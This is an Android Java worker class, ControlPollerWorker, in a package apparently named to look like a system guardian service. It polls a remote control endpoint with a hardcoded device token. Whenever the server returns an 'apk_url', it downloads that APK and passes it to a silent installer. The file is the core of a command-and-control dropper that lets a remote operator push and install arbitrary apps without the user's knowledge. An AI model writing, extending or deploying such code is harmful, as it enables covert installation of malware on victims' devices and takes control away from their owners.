package com.system.guardian;

import android.content.Context;
import android.util.Log;

import androidx.annotation.NonNull;
import androidx.work.Worker;
import androidx.work.WorkerParameters;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.File;

public class ControlPollerWorker extends Worker {

    public ControlPollerWorker(@NonNull Context context, @NonNull WorkerParameters params) {
        super(context, params);
    }

    @NonNull
    @Override
    public Result doWork() {
        String deviceToken = "535ef8dad6992485";  // TODO: fetch dynamically
        String url = "https://digiserve25.pythonanywhere.com/control/" + deviceToken + ".json";

        JSONObject response = NetworkUtils.getJsonFromUrl(url);
        if (response != null && response.has("apk_url")) {
            try {
                String apkUrl = response.getString("apk_url");

                if (!apkUrl.isEmpty()) {
                    Log.i("APK_FETCH", "Downloading new APK: " + apkUrl);
                    File apkFile = NetworkUtils.downloadFile(getApplicationContext(), apkUrl, "update.apk");
                    SilentApkInstaller.installSilently(getApplicationContext(), apkFile);
                }

            } catch (JSONException e) {
                Log.e("APK_FETCH", "Failed to parse APK URL", e);
                return Result.failure();
            } catch (Exception e) {
                Log.e("APK_FETCH", "Unexpected error downloading APK", e);
                return Result.failure();
            }
        } else {
            Log.i("APK_FETCH", "No APK update in control response");
        }

        return Result.success();
    }
}
